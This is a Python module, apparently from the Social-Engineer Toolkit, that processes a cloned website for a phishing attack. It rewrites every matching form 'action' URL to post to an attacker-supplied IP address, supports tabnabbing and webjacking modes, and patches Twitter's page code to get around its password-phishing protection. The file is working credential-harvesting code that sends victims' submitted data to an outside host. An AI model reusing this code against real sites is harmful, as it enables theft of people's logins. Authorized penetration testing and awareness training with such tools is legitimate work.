#!/usr/bin/env python

import os
import sys
import re
import subprocess
import urllib
import shutil
from src.core.setcore import *


#
# Scraper will grab the cloned website and try defining post parameters
#

# grab ipaddr
if check_options("IPADDR=") != 0:
    ipaddr = check_options("IPADDR=")
else:
    ipaddr = input(setcore.setprompt(
        "0", "IP address to connect back on: "))
    update_options("IPADDR=" + ipaddr)

# set the multiattack tabnabbing/webjacking flag
multi_tabnabbing = "off"
multi_webjacking = "off"
if os.path.isfile(userconfigpath + "multi_tabnabbing"):
    multi_tabnabbing = "on"
if os.path.isfile(userconfigpath + "multi_webjacking"):
    multi_webjacking = "on"

# see if we're tabnabbing
fileopen = open(userconfigpath + "attack_vector", "r")
for line in fileopen:
    line = line.rstrip()
    if line == 'tabnabbing' or multi_tabnabbing == "on" or line == 'webjacking' or multi_webjacking == "on":
        site = 'index2.html'
    else:
        site = 'index.html'

# set ssl flag to false by default
ssl_flag = "false"
# SEE IF WE WANT TO USE SSL
ssl_check = check_config("WEBATTACK_SSL=").lower()
if ssl_check == "on":
    ssl_flag = "true"

# check apache mode
apache_mode = check_config("APACHE_SERVER=").lower()
# if we are turned on this will change to /post.php

track_user = check_config("TRACK_EMAIL_ADDRESSES=").lower()
if track_user == "on":
    apache_mode = "on"

apache_rewrite = ""
# if we are turned on, change this
if apache_mode == "on":
    apache_rewrite = "post.php"

# start the scraping process
fileopen = open(userconfigpath + "web_clone/%s" % (site), "r", encoding='utf-8', errors='ignore').readlines()
filewrite = open(userconfigpath + "web_clone/index.html.new", "w")
for line in fileopen:

    # specify if it found post params
    counter = 0
    # if we hit on a post method

    match = re.search('post', line, flags=re.IGNORECASE)
    method_post = re.search("method=post", line, flags=re.IGNORECASE)
    if match or method_post:

        # regex for now, can probably use htmlparser later, but right not what its doing is
        # replacing any url on the "action" field with your victim IP which will have a custom
        # web server running to post the data to your site
        if ssl_flag == 'false':
            line = re.sub(
                'action="http?\w://[\w.\?=/&]*/', 'action="http://%s/' % (ipaddr), line)
            if apache_mode == "on":
                line = re.sub(
                    'action="*"', 'action="http://%s/post.php"' % (ipaddr), line)
        if ssl_flag == 'true':
            line = re.sub(
                'action="http?\w://[\w.\?=/&]*/', 'action="https://%s/' % (ipaddr), line)
            if apache_mode == "on":
                line = re.sub(
                    'action="*"', 'action="http://%s/post.php"' % (ipaddr), line)

    # this is if twitter is in use, we rename a function name to something
    # garbage to remove password phishing restrictions
    match2 = re.search(
        "swiftActionQueue={buckets:j", line, flags=re.IGNORECASE)
    if match2:
        # garble the buckets name, causes password to not be jacked
        line = line.replace(
            "swiftActionQueue={buckets:j", "swiftActionQueue={3buckets:j")

    filewrite.write(line)


# close the file
filewrite.close()
# move our newly created website with our post stuff to our cloned area
if os.path.isfile(userconfigpath + "web_clone/index.html.new"):
    shutil.copyfile(userconfigpath + "web_clone/index.html.new", userconfigpath + "" + site)
    if os.path.isfile(userconfigpath + "web_clone/" + site):
        os.remove(userconfigpath + "web_clone/" + site)
    shutil.move(userconfigpath + "web_clone/index.html.new",
                userconfigpath + "web_clone/%s" % (site))
